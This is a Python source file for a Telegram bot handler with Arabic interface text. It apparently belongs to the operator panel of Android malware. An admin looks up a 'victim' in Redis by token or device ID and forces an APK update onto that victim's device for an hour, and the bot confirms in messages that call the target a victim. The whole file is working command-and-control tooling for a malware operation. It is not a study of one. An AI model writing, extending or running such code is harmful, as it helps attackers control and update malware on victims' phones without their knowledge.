# bot_handlers/steps/update_steps.py
import json
import time

from config import bot, redis_client
from imports_manager import is_admin
from logging_config import get_logger

from ..helpers import h
from ..keyboards import build_update_panel

logger = get_logger("bot_handlers.steps.update")


def upd_target_handler(message):
    if not is_admin(message.chat.id):
        return
    if not message.text:
        bot.send_message(message.chat.id, "❌ أرسل token صحيح")
        return

    target = message.text.strip()

    try:
        found_victim_id = None

        if redis_client:
            # ابحث بـ token
            token_key = f"victim_token:{target}"
            raw = redis_client.get(token_key)
            if raw:
                info = json.loads(raw)
                found_victim_id = info.get("victim_id")

            # ابحث بـ device_id
            if not found_victim_id:
                keys = redis_client.keys("victim:*:*")
                for key in keys[:200]:
                    try:
                        v = redis_client.hgetall(key)
                        if v.get("device_id") == target:
                            found_victim_id = v.get("victim_id")
                            break
                    except Exception:
                        continue

        if not found_victim_id:
            bot.send_message(
                message.chat.id,
                f"❌ <b>لم يتم العثور على الضحية</b>\n\n"
                f"🔍 البحث عن: <code>{h(target[:40])}</code>",
                parse_mode="HTML"
            )
            return

        if redis_client:
            redis_client.setex(
                f"apk_force_update:{found_victim_id}",
                3600,
                str(int(time.time()))
            )

        bot.send_message(
            message.chat.id,
            f"✅ <b>تم تفعيل التحديث لضحية محددة</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <code>{h(found_victim_id[:16])}</code>\n"
            f"⏰ المدة: ساعة",
            parse_mode="HTML",
            reply_markup=build_update_panel()
        )
    except Exception as e:
        logger.exception(f"upd_target_handler error: {e}")
        bot.send_message(message.chat.id, f"❌ خطأ: {h(str(e)[:200])}", parse_mode="HTML")
